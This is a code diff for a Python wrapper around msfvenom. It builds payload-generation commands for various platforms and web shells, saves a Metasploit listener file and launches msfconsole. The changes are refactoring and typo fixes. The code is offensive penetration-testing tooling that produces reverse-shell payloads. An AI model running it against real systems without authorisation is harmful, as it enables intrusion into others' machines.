@@ -129,18 +129,22 @@ def generate_payload(params,number,avail_payloads):
     pname = " ".join([K_TYPE, K_ARCH,K_MET, K_BIND,K_STAGE,IP,str(PORT)]).replace(" ","-") # Pretify pname
     pname = "_" + pname # Fast trick to remove all payloads later in dir via rm _*
     
+    if not K_TYPE: 
+        # Seen when Keyword is the only input
+        K_TYPE = pname.split("/")[0]
+       
     if any([cmd in payload_cmd for cmd in ["aix","apple_ios","bsd","cmd/","vbs","python","powershell", "android", "perl","ruby","solaris"]]):
         K_TYPE=""
         print(Orange("[EXPERIMENTAL] You'll need to add the extension to the file (ex: .py for Python)"))
         print(Green("[*] Processing payload.."))
         payload="msfvenom -p {} {}={} LPORT={} -f raw -o {}".format(payload_cmd,HOST, IP,PORT,pname)       
     
-    if "osx/" in payload_cmd:
+    elif "osx/" in payload_cmd:
         print(Green("[*] Processing OSX payload.."))
         K_TYPE=""
         payload="msfvenom -p {} {}={} LPORT={} -f macho -o {}".format(payload_cmd,HOST, IP,PORT,pname + ".macho")
     
-    if args.SHELL_TYPE == "web":
+    elif args.SHELL_TYPE == "web":
         K_FORMAT = K_EXT if K_EXT != "jsp" else "raw"
         payload="msfvenom -p {} {}={} LPORT={} -f {} -o {}".format(payload_cmd,HOST, IP,PORT,K_FORMAT, pname + "." + K_EXT)
     
@@ -174,7 +178,7 @@ def generate_payload(params,number,avail_payloads):
                 f.write(msf_cmd)
             
             print(Green("[+] Saved Listener for later use as listener.rc"))
-            print(Green("[+]   if Msfconsole already open, paste:"))
+            print(Green("[+]   if Msfconsole already opened, paste:"))
             print(Green("{}".format(msf_cmd)))
             print(Green("[*] Launching Metasploit ..."))
             # Launch metasploit in another terminal
@@ -235,7 +239,7 @@ if __name__ == "__main__":
     K_KEY= args.keyword if args.keyword else ""	
     # Get Architecture 
     # Warning: in MSFvenom, when OS = Windows, x86 keyword is never displayed
-    # With other payloads like android, we should relax the default x86 arg othrwise we'll found nothing
+    # With other payloads like android, we should relax the default x86 arg otherwise we'll found nothing
     if (K_TYPE == "windows" and args.arch=="x86") or (K_KEY):
         K_ARCH=""
     else:
